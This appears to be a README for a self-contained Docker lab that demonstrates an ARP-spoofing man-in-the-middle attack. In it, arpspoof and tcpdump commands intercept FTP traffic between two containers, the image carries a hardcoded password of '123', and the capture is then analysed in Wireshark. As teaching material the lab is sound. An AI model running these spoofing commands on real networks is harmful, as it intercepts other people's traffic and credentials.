# Setting Up Environmental Variables 


``` export image_name=your_image_name  ```

# Building Customized Image of Container 


```docker build -t $image_name -f ubuntu-dockerfile . ```

``` docker build -t $image_name -f ubuntu-dockerfile  . ```




# Running Containers With  Docker Compose




``` docker-compose  -f docker-compose.yaml up ```




# To Get IP Address of Container 


docker ps 

docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'  {_container1_name_}

docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'  {_container2_name_}


or You can run the script

``` bash ipaddr-mac.sh ```





# SSH Into Each Container 

``` ssh buddy@ip_of_container_1 ```                                                                                  

``` ssh budy@ip_of_container_2  ```                                                                                     

``` ssh buddy@ip_of_container_3 ```

#  Inside Each Container 

``` sudo  apt update && bash script.sh ``` 

pass :- 123 hardcoded in the image 

# Inside Container 1 

``` arpspoof -i eth0 -t container_2_ip_addr  container_3_ip_addr ```

``` arpspoof -i eth0 -t container_3_ip_addr  container_2_ip_addr ```

``` tcpdump -i eth0 -w data_capture.pcap  port 21  ```


# Inside   Container 2 & Container  3 

Make Sure FTP is installed and running in Container 2 and 3 . You can install the package "VSFTPD" and run the service .

From Container  2 we  will ftp into Container 3

``` ftp container_3_ip_addr ```

Once you  have created  a  Session Stop the  tcpdump on First Container . Open it with Wireshark  and you can analyze the packets 

# Tutorial 

Refer to the YTube Video for demonstration :- 


YTube :- UnixPanda


https://youtu.be/ipPH79Ce-wI?si=myHS0x7X9BHNIsFT


